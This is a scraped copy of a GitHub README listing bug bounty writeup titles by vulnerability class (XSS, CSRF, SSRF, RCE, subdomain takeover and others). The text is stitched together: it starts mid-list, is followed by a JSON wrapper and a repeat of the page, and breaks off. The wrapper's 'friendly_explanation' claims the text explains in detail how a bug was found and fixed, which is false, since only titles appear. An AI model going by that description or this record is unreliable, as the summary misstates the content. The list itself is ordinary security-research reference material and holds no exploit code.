philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#subdomain-takeover", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#subdomain-takeover. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS 